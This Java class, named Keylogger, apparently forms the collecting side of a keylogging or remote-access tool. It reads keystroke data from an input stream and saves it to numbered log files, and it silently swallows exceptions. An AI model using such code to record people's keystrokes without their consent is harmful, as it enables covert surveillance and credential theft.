package model;

import java.io.*;

public class Keylogger {
    public Keylogger(InputStream inputStream, OutputStream outputStream)
    {
        initComponents(inputStream, outputStream);
    }

    private void initComponents(InputStream inputStream, OutputStream outputStream)
    {
        this.inputStream = inputStream;
        this.outputStream = outputStream;
    }

    public void handleHook()
    {
        isHook = true;
    }

    public void handleUnHook()
    {
        try
        {
            writer = new PrintWriter("./keylogging/keylog" + Integer.toString(currentFileName) + ".txt", "UTF-8");
            writer.println(keylogging);
            writer.close();
            keylogging = "";
            isHook = false;
        }
        catch (FileNotFoundException fnfE)
        {

        }
        catch (UnsupportedEncodingException ueE)
        {

        }

        return;
    }

    public String handlePrint()
    {
        try
        {
            if (isHook)
            {
                byte[] buffer = new byte[5 * 1024];
                inputStream.read(buffer);
                keylogging = new String(buffer);
                keylogging = keylogging.trim();

                return keylogging;
            }
        }
        catch (IOException ioE)
        {
            //
        }

        return keylogging;
    }

    public String getKeylogging() {
        return keylogging;
    }

    public void setCurrentFileName(int currentFileName) {
        this.currentFileName = currentFileName;
    }

    public int getCurrentFileName() {
        return currentFileName;
    }

    private InputStream inputStream;
    private OutputStream outputStream;
    private Boolean isHook;
    private String keylogging;
    private PrintWriter writer;
    private int currentFileName = 0;
}
